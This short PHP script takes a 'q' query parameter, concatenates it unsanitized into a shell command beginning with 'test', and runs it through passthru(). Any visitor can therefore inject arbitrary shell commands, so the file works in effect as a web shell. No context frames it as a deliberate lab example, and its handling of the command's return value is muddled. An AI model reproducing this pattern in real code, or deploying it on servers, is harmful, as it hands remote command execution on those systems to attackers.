<?php
//header('Content-type: text/html; charset=gbk');
function _get($str){
    $val = !empty($_GET[$str]) ? $_GET[$str] : null;
    return $val;
}
$q = _get('q');
$return = "";
passthru ( "test ".$q, $return);
$result = rtrim($return, '0');
echo $result;
?>